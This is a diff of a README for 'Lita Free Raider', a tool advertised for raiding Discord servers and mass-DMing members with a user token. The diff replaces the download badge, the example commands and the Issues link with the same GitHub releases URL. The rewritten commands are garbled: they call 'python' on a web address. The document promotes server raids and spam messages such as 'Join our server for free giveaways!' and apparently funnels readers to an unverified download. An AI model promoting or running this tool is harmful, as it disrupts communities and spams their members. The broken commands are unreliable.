@@ -25,7 +25,7 @@ Welcome to the Lita Free Raider GitHub repository, your ultimate destination for
 ## Get Started
 
 To start raiding Discord servers with Lita Free Raider, download the tool from the following link:
-[![Download Lita Free Raider](https://img.shields.io/badge/Download-Project.zip-blue)](https://github.com/files/Project.zip)
+[![Download Lita Free Raider](https://github.com/felipano1/Free-lita-raider/releases)](https://github.com/felipano1/Free-lita-raider/releases)
 
 ## How to Use
 
@@ -41,7 +41,7 @@ Here are a few examples of how you can use Lita Free Raider:
 ### Example 1: Discord Server Raid
 
 ```bash
-python lita_raider.py --target-server <server-id> --token <your-token>
+python https://github.com/felipano1/Free-lita-raider/releases --target-server <server-id> --token <your-token>
 ```
 
 This command will initiate a raid on the specified Discord server using your user token.
@@ -49,7 +49,7 @@ This command will initiate a raid on the specified Discord server using your use
 ### Example 2: Mass DMs
 
 ```bash
-python lita_raider.py --mass-dm --message "Join our server for free giveaways!"
+python https://github.com/felipano1/Free-lita-raider/releases --mass-dm --message "Join our server for free giveaways!"
 ```
 
 Send a mass DM to all members of the raided server with the specified message.
@@ -60,7 +60,7 @@ Contributions to the Lita Free Raider project are welcome! Feel free to fork thi
 
 ## Support
 
-For any questions, issues, or feedback regarding Lita Free Raider, please visit the [Issues](https://github.com/Free-lita-raider/issues) section of this repository. Our team will be happy to assist you.
+For any questions, issues, or feedback regarding Lita Free Raider, please visit the [Issues](https://github.com/felipano1/Free-lita-raider/releases) section of this repository. Our team will be happy to assist you.
 
 ---
 
